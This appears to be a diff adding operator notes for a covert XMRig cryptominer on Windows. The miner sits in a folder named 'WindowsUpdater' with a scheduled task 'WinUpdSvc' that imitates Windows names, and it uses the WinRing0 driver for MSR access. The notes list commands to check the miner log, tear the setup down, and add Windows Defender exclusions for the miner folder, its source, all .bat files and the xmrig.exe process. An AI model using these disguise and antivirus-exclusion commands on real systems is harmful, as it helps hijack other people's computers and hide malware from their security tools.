@@ -1,0 +1,39 @@
+Verify MSR:
+
+sc query WinRing0_1_2_0
+ 
+
+
+check miner log:
+
+type "%ProgramData%\WindowsUpdater\miner.log" | find "MSR"
+
+
+
+Clean Up:
+taskkill /IM xmrig.exe /F
+wmic process where (name="cmd.exe" and user="NT AUTHORITY\\SYSTEM") call terminate
+taskkill /IM wscript.exe /F
+schtasks /delete /tn WinUpdSvc /f
+sc stop WinRing0_1_2_0
+sc delete WinRing0_1_2_0
+rmdir /s /q C:\ProgramData\WindowsUpdater
+
+
+
+
+add anitvirus exceptins:
+
+powershell -Command "Add-MpPreference -ExclusionPath 'C:\ProgramData\WindowsUpdater'"
+powershell -Command "Add-MpPreference -ExclusionPath '%CD%\miner_src'"
+
+
+alternate(antiviruss exceptions):
+
+# Add folder exclusions
+Add-MpPreference -ExclusionPath "C:\ProgramData\WindowsUpdater"
+Add-MpPreference -ExclusionPath "$((Get-Location).Path)\miner_src"
+
+# Add file exclusions
+Add-MpPreference -ExclusionExtension ".bat"
+Add-MpPreference -ExclusionProcess "xmrig.exe"
